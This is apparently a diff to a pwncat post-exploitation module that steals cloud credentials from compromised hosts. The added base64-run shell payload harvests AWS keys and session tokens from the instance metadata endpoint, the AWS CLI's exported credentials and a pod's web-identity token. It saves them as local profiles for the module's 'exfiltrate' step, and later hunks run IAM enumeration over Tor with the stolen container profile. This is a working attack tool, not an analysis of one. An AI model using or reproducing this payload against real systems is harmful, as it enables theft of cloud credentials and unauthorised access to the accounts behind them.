@@ -40,6 +40,7 @@ class Module(BaseModule):
         session.log("starting module")
 
         session_lock = Path("/tmp/pwncat_session.lock")
+        task_name = "default"
 
         try:
             session.log("creating session lock: /tmp/pwncat_session.lock")
@@ -111,28 +112,96 @@ class Module(BaseModule):
             def exfiltrate(csp):
                 # create an instance profile to exfiltrate
                 if csp == "aws":
-                    payload = '''opts="--no-cli-pager"
-INSTANCE_PROFILE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials)
-AWS_ACCESS_KEY_ID=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "AccessKeyId" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
-AWS_SECRET_ACCESS_KEY=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "SecretAccessKey" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
-AWS_SESSION_TOKEN=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "Token" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
-AWS_DEFAULT_REGION=$(curl -s http://169.254.169.254/latest/meta-data/placement/region)
-cat > .aws-ec2-instance <<EOF
-AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID
-AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY
-AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN
-AWS_DEFAULT_REGION=us-east-1
-AWS_DEFAULT_OUTPUT=json
-EOF
-PROFILE="instance"
-aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID --profile=$PROFILE
-aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY --profile=$PROFILE
-aws configure set aws_session_token $AWS_SESSION_TOKEN --profile=$PROFILE
-aws configure set region $AWS_DEFAULT_REGION --profile=$PROFILE
-aws configure set output json --profile=$PROFILE'''
-                    session.log("creating an instance creds profile...")
+                    payload = '''
+# disable pager
+export AWS_PAGER=""
+
+# Helper function to update AWS configuration and credentials files
+configure_aws() {
+    local profile=$1
+    local access_key=$2
+    local secret_key=$3
+    local session_token=$4
+    local region=$5
+
+    mkdir -p ~/.aws
+    aws configure set aws_access_key_id "$access_key" --profile=$profile
+    aws configure set aws_secret_access_key "$secret_key" --profile=$profile
+    aws configure set aws_session_token "$session_token" --profile=$profile
+    aws configure set region "$region" --profile=$profile
+}
+
+# Retrieve and configure current user credentials using AWS CLI
+configure_current_user() {
+    if command -v aws &> /dev/null; then
+        # Export credentials using aws configure export-credentials
+        local creds=$(aws configure export-credentials --format env-no-export)
+
+        # Parse the credentials
+        local access_key=$(echo "$creds" | grep 'AWS_ACCESS_KEY_ID' | cut -d '=' -f 2)
+        local secret_key=$(echo "$creds" | grep 'AWS_SECRET_ACCESS_KEY' | cut -d '=' -f 2)
+        local session_token=$(echo "$creds" | grep 'AWS_SESSION_TOKEN' | cut -d '=' -f 2)
+        local region=$(curl -s http://169.254.169.254/latest/meta-data/placement/region)
+
+        # Use the helper function to configure the 'default' profile
+        configure_aws default "$access_key" "$secret_key" "$session_token" "$region"
+    else
+        # Fallback to environment variables if AWS CLI is not present
+        if [ -n "$AWS_ACCESS_KEY_ID" ] && [ -n "$AWS_SECRET_ACCESS_KEY" ]; then
+            configure_aws default "$AWS_ACCESS_KEY_ID" "$AWS_SECRET_ACCESS_KEY" "$AWS_SESSION_TOKEN" "$(curl -s http://169.254.169.254/latest/meta-data/placement/region)"
+        fi
+    fi
+}
+
+# Retrieve and configure instance profile credentials
+configure_instance_profile() {
+    local instance_profile=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+    local credentials=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$instance_profile)
+    local access_key=$(echo "$credentials" | grep "AccessKeyId" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
+    local secret_key=$(echo "$credentials" | grep "SecretAccessKey" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
+    local session_token=$(echo "$credentials" | grep "Token" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
+    local region=$(curl -s http://169.254.169.254/latest/meta-data/placement/region)
+
+    configure_aws instance $access_key $secret_key $session_token $region
+}
+
+# Retrieve and configure container/web identity credentials using environment variables
+configure_container_identity() {
+    if command -v aws &> /dev/null; then
+        # Export credentials using aws configure export-credentials
+        local creds=$(aws configure export-credentials --format env-no-export)
+
+        # Parse the credentials
+        local access_key=$(echo "$creds" | grep 'AWS_ACCESS_KEY_ID' | cut -d '=' -f 2)
+        local secret_key=$(echo "$creds" | grep 'AWS_SECRET_ACCESS_KEY' | cut -d '=' -f 2)
+        local session_token=$(echo "$creds" | grep 'AWS_SESSION_TOKEN' | cut -d '=' -f 2)
+        local region=$(curl -s http://169.254.169.254/latest/meta-data/placement/region)
+
+        # Use the helper function to configure the 'default' profile
+        configure_aws container "$access_key" "$secret_key" "$session_token" "$region"
+    else
+        local temp_role=$(aws sts assume-role-with-web-identity \
+            --role-arn $AWS_ROLE_ARN \
+            --role-session-name "example-session" \
+            --web-identity-token file://$AWS_WEB_IDENTITY_TOKEN_FILE \
+            --duration-seconds 3600)
+        local access_key=$(echo $temp_role | jq -r '.Credentials.AccessKeyId')
+        local secret_key=$(echo $temp_role | jq -r '.Credentials.SecretAccessKey')
+        local session_token=$(echo $temp_role | jq -r '.Credentials.SessionToken')
+        local region=$(aws configure get region)  # Assuming same region as CLI or default
+
+        configure_aws container $access_key $secret_key $session_token $region
+    fi
+}
+
+configure_current_user
+configure_instance_profile
+configure_container_identity
+'''
+                    session.log(
+                        "exporting possible default, instance and container credentials...")
                     result = run_base64_payload(
-                        session=session, payload=payload, log_name="payload_awsconfig")
+                        session=session, payload=payload, log_name="payload_awsconfigcreds")
                     session.log(result)
 
                     # remove any pre-existing cred archived
@@ -590,16 +659,16 @@ echo $BUCKET_URL
                 csp = "aws"
                 # context here is we're inside pod that has access to s3
                 enum_exfil_prep_creds(csp, "iam2enum")
-                session.log("running iam2enum enumeration...")
-                # here we'll have instance credentials from the pod
+                session.log(
+                    "running iam2enum container profile enumeration...")
+                # here we'll have oidc container credentials from the pod
                 credentialed_access_tor(
                     csp=csp,
                     jobname="iam2enum",
                     cwd=f'/iam2enum',
                     script=f'iam2enum.sh',
-                    args="--profile=instance"
+                    args="--profile=container"
                 )
-                session.log("iam2enum enumeration complete")
 
                 tmp_dir = Path("/tmp")
                 # create work directory
@@ -663,7 +732,7 @@ echo $BUCKET_URL
         pwncat_log = Path("/tmp/pwncat.log")
         if pwncat_log.exists():
             dest_log = Path(
-                f"/tmp/{datetime.utcnow().strftime('%Y%m%d%H%M%S')}_pwncat.log")
+                f"/tmp/{datetime.utcnow().strftime('%Y%m%d%H%M%S')}_{task_name}_pwncat.log")
             session.log(
                 f"Moving successful session log {pwncat_log.as_posix()} => {dest_log.as_posix()}")
             pwncat_log.rename(dest_log)
